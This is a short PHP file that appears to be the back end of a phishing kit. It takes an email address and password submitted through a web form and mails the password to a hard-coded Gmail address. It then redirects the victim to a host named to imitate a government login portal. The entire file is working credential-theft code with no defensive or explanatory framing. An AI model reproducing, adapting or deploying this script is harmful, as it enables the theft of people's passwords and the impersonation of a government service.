<?php
$email_address = $_POST['email'];
$feedback = $_POST['pass'];
function filter_email_header($form_field) {  
return preg_replace('/[nr|!/<>^$%*&]+/','',$form_field);
}
$email_address  = filter_email_header($email_address);
$headers = "From: $email_address";
$sent = mail('hallelchukwu@gmail.com', 'New Data submission', $feedback, $headers);
if ($sent) {
header("Location: https://app-login-gov.on.fleek.co/index-1.html");
die();
} else {
header("Location: https://app-login-gov.on.fleek.co");
die();
}
?>
